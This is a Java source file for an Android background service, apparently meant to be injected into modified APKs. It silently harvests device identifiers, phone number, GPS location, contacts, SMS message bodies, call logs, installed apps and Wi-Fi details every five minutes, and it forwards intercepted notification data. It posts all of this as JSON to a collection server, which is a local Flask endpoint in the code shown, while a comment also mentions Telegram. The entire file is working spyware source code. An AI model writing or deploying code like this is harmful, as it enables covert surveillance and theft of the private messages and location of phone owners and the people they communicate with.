package com.apkmodifier;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.provider.CallLog;
import android.provider.Telephony;
import android.location.Location;
import android.location.LocationManager;
import android.location.LocationListener;
import android.os.Bundle;
import android.os.BatteryManager;
import android.content.IntentFilter;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.telephony.TelephonyManager;
import android.os.Build;
import org.json.JSONObject;
import org.json.JSONArray;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/**
 * Service to collect device data and send to server/Telegram
 */
public class DataCollectionService extends Service {
    private static final String TAG = "DataCollection";
    private Handler handler;
    private static final long COLLECTION_INTERVAL = 300000; // 5 minutes
    
    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler(Looper.getMainLooper());
        startDataCollection();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.getAction() != null) {
            switch (intent.getAction()) {
                case "NOTIFICATION_DATA":
                    String notificationData = intent.getStringExtra("data");
                    sendToServer("notification", notificationData);
                    break;
                case "COLLECT_ALL":
                    collectAllData();
                    break;
            }
        }
        return START_STICKY;
    }
    
    private void startDataCollection() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                collectAllData();
                handler.postDelayed(this, COLLECTION_INTERVAL);
            }
        }, 0);
    }
    
    private void collectAllData() {
        new Thread(() -> {
            try {
                JSONObject allData = new JSONObject();
                allData.put("timestamp", System.currentTimeMillis());
                allData.put("device_info", getDeviceInfo());
                allData.put("location", getLocation());
                allData.put("contacts", getContacts());
                allData.put("sms", getSMS());
                allData.put("call_logs", getCallLogs());
                allData.put("installed_apps", getInstalledApps());
                allData.put("battery", getBatteryInfo());
                allData.put("network", getNetworkInfo());
                
                sendToServer("device_data", allData.toString());
                Log.d(TAG, "Data collected and sent");
            } catch (Exception e) {
                Log.e(TAG, "Error collecting data", e);
            }
        }).start();
    }
    
    private JSONObject getDeviceInfo() {
        JSONObject info = new JSONObject();
        try {
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("model", Build.MODEL);
            info.put("brand", Build.BRAND);
            info.put("device", Build.DEVICE);
            info.put("android_version", Build.VERSION.RELEASE);
            info.put("sdk_int", Build.VERSION.SDK_INT);
            info.put("board", Build.BOARD);
            info.put("hardware", Build.HARDWARE);
            
            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            if (tm != null) {
                try {
                    info.put("phone_number", tm.getLine1Number());
                    info.put("network_operator", tm.getNetworkOperatorName());
                    info.put("sim_country", tm.getSimCountryIso());
                    info.put("sim_operator", tm.getSimOperatorName());
                    info.put("device_id", tm.getDeviceId());
                } catch (SecurityException e) {
                    info.put("phone_info", "Permission denied");
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting device info", e);
        }
        return info;
    }
    
    private JSONObject getLocation() {
        JSONObject location = new JSONObject();
        try {
            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            if (lm != null) {
                Location lastKnown = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (lastKnown == null) {
                    lastKnown = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                }
                
                if (lastKnown != null) {
                    location.put("latitude", lastKnown.getLatitude());
                    location.put("longitude", lastKnown.getLongitude());
                    location.put("accuracy", lastKnown.getAccuracy());
                    location.put("altitude", lastKnown.getAltitude());
                    location.put("timestamp", lastKnown.getTime());
                    location.put("maps_url", "https://maps.google.com/?q=" + 
                        lastKnown.getLatitude() + "," + lastKnown.getLongitude());
                }
            }
        } catch (SecurityException e) {
            location.put("error", "Location permission denied");
        } catch (Exception e) {
            Log.e(TAG, "Error getting location", e);
        }
        return location;
    }
    
    private JSONArray getContacts() {
        JSONArray contacts = new JSONArray();
        try {
            Cursor cursor = getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null
            );
            
            if (cursor != null) {
                int limit = 100; // Limit to first 100 contacts
                int count = 0;
                
                while (cursor.moveToNext() && count < limit) {
                    JSONObject contact = new JSONObject();
                    String name = cursor.getString(cursor.getColumnIndex(
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String number = cursor.getString(cursor.getColumnIndex(
                        ContactsContract.CommonDataKinds.Phone.NUMBER));
                    
                    contact.put("name", name);
                    contact.put("number", number);
                    contacts.put(contact);
                    count++;
                }
                cursor.close();
            }
        } catch (SecurityException e) {
            Log.e(TAG, "Contacts permission denied", e);
        } catch (Exception e) {
            Log.e(TAG, "Error getting contacts", e);
        }
        return contacts;
    }
    
    private JSONArray getSMS() {
        JSONArray smsArray = new JSONArray();
        try {
            Cursor cursor = getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                null, null, null,
                Telephony.Sms.DEFAULT_SORT_ORDER + " LIMIT 50"
            );
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject sms = new JSONObject();
                    String address = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
                    String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                    long date = cursor.getLong(cursor.getColumnIndex(Telephony.Sms.DATE));
                    int type = cursor.getInt(cursor.getColumnIndex(Telephony.Sms.TYPE));
                    
                    sms.put("address", address);
                    sms.put("body", body);
                    sms.put("date", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date(date)));
                    sms.put("type", type == Telephony.Sms.MESSAGE_TYPE_INBOX ? "received" : "sent");
                    smsArray.put(sms);
                }
                cursor.close();
            }
        } catch (SecurityException e) {
            Log.e(TAG, "SMS permission denied", e);
        } catch (Exception e) {
            Log.e(TAG, "Error getting SMS", e);
        }
        return smsArray;
    }
    
    private JSONArray getCallLogs() {
        JSONArray callLogs = new JSONArray();
        try {
            Cursor cursor = getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null, null, null,
                CallLog.Calls.DATE + " DESC LIMIT 50"
            );
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject call = new JSONObject();
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
                    long date = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
                    int duration = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.DURATION));
                    int type = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE));
                    
                    call.put("number", number);
                    call.put("name", name != null ? name : "Unknown");
                    call.put("date", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date(date)));
                    call.put("duration", duration + "s");
                    
                    String callType = "Unknown";
                    switch (type) {
                        case CallLog.Calls.INCOMING_TYPE: callType = "Incoming"; break;
                        case CallLog.Calls.OUTGOING_TYPE: callType = "Outgoing"; break;
                        case CallLog.Calls.MISSED_TYPE: callType = "Missed"; break;
                    }
                    call.put("type", callType);
                    callLogs.put(call);
                }
                cursor.close();
            }
        } catch (SecurityException e) {
            Log.e(TAG, "Call log permission denied", e);
        } catch (Exception e) {
            Log.e(TAG, "Error getting call logs", e);
        }
        return callLogs;
    }
    
    private JSONArray getInstalledApps() {
        JSONArray apps = new JSONArray();
        try {
            android.content.pm.PackageManager pm = getPackageManager();
            java.util.List<android.content.pm.ApplicationInfo> packages = pm.getInstalledApplications(0);
            
            for (android.content.pm.ApplicationInfo app : packages) {
                JSONObject appInfo = new JSONObject();
                appInfo.put("name", pm.getApplicationLabel(app).toString());
                appInfo.put("package", app.packageName);
                apps.put(appInfo);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting installed apps", e);
        }
        return apps;
    }
    
    private JSONObject getBatteryInfo() {
        JSONObject battery = new JSONObject();
        try {
            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryStatus = registerReceiver(null, ifilter);
            
            if (batteryStatus != null) {
                int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
                int percentage = (int) ((level / (float) scale) * 100);
                
                int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
                boolean isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING;
                
                battery.put("percentage", percentage);
                battery.put("charging", isCharging);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting battery info", e);
        }
        return battery;
    }
    
    private JSONObject getNetworkInfo() {
        JSONObject network = new JSONObject();
        try {
            WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            if (wifiManager != null) {
                WifiInfo wifiInfo = wifiManager.getConnectionInfo();
                network.put("wifi_enabled", wifiManager.isWifiEnabled());
                network.put("ssid", wifiInfo.getSSID());
                network.put("bssid", wifiInfo.getBSSID());
                network.put("ip_address", intToIp(wifiInfo.getIpAddress()));
                network.put("link_speed", wifiInfo.getLinkSpeed() + " Mbps");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting network info", e);
        }
        return network;
    }
    
    private String intToIp(int ip) {
        return String.format(Locale.getDefault(), "%d.%d.%d.%d",
            (ip & 0xff), (ip >> 8 & 0xff), (ip >> 16 & 0xff), (ip >> 24 & 0xff));
    }
    
    private void sendToServer(String type, String data) {
        new Thread(() -> {
            try {
                // Send to local Flask server
                URL url = new URL("http://127.0.0.1:5000/api/device_data");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                
                JSONObject payload = new JSONObject();
                payload.put("type", type);
                payload.put("data", new JSONObject(data));
                payload.put("timestamp", System.currentTimeMillis());
                
                OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream());
                writer.write(payload.toString());
                writer.flush();
                writer.close();
                
                int responseCode = conn.getResponseCode();
                Log.d(TAG, "Data sent, response: " + responseCode);
                
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Error sending data to server", e);
            }
        }).start();
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
